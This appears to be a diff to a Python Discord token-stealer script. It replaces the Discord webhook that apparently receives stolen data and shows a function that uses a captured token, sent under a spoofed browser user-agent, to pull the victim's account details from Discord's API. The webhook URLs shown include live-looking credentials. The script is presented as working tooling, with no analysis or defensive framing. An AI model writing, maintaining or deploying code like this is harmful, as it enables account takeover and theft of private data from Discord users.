@@ -1,6 +1,6 @@
 import os, re, json, random, platform, socket, uuid, requests
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/904566022768558100/Km3pZICG7wYZUXzQff6NL910KgCQpZmIn-MwD6khO8CCR8IsEsHr5PuVNoYskEfHZxf8"
+WEBHOOK_URL = "https://discord.com/api/webhooks/927741291452841994/OwJNgzQAzcqTFasERdArELD_o1aHFsj9G83m8awbLWaPDrr-gYRF27SPVSoYWdk8Lp3x"
 
 def retrieve_user(token):
     return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)
